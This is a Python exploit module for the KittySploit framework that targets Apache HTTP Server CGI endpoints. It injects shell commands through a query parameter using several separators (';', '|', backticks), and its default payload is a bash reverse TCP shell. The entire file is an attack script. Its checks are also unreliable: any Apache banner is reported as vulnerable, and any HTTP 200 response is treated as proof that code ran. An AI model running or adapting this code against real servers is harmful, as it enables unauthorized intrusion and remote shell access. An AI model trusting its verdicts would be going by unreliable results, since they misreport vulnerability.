#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
import urllib.parse


class Module(Exploit, Http_client):

    __info__ = {
        "name": "Apache HTTP Server RCE",
        "description": "Remote Code Execution exploit for Apache HTTP Server vulnerabilities including mod_cgi, mod_rewrite, and other module vulnerabilities",
        "author": "KittySploit Team",
        "cve": [],
        "arch": [Arch.X86, Arch.X64],
        "platform": Platform.LINUX,
        "category": "singles",
        "payload": {
            "default": "payloads/singles/cmd/unix/bash_reverse_tcp",
            "arch": "cmd",
            "platform": [Platform.LINUX],
            "category": "singles",
        }
    }

    exploit_path = OptString("/cgi-bin/test.cgi", "Path to vulnerable CGI endpoint", required=False)
    command_param = OptString("cmd", "Parameter name for command injection", required=False)

    def check(self):
        """
        Check if the target is vulnerable
        """
        try:
            response = self.http_request(method="GET", path="/")
            if response:
                server_header = response.headers.get('Server', '').lower()
                if 'apache' in server_header:
                    return {
                        'vulnerable': True,
                        'reason': 'Apache server detected',
                        'confidence': 'medium'
                    }
            return {
                'vulnerable': False,
                'reason': 'Apache server not detected',
                'confidence': 'low'
            }
        except Exception as e:
            return {
                'vulnerable': False,
                'reason': f'Check failed: {str(e)}',
                'confidence': 'low'
            }

    def run(self):
        """
        Execute the exploit
        """
        try:
            print_status("Attempting Apache RCE exploit...")
            
            # Try mod_cgi exploitation
            if self.exploit_path.value:
                path = self.exploit_path.value
            else:
                # Try common CGI paths
                cgi_paths = ['/cgi-bin/test.cgi', '/cgi-bin/printenv', '/cgi-bin/status']
                path = cgi_paths[0]
            
            # Construct command injection payload
            param = self.command_param.value if self.command_param.value else 'cmd'
            command = self.payload
            
            # Try different injection techniques
            injection_payloads = [
                f"{path}?{param}={urllib.parse.quote(command)}",
                f"{path}?{param}=;{urllib.parse.quote(command)}",
                f"{path}?{param}=|{urllib.parse.quote(command)}",
                f"{path}?{param}=`{urllib.parse.quote(command)}`",
            ]
            
            for payload_path in injection_payloads:
                print_info(f"Trying: {payload_path}")
                response = self.http_request(
                    method="GET",
                    path=payload_path,
                    allow_redirects=False,
                    timeout=10
                )
                
                if response and response.status_code == 200:
                    print_success("Command executed successfully")
                    self.vulnerable()
                    return True
            
            print_error("Exploitation failed - target may not be vulnerable")
            self.not_vulnerable()
            return False
            
        except Exception as e:
            print_error(f"Exploitation failed: {e}")
            return False
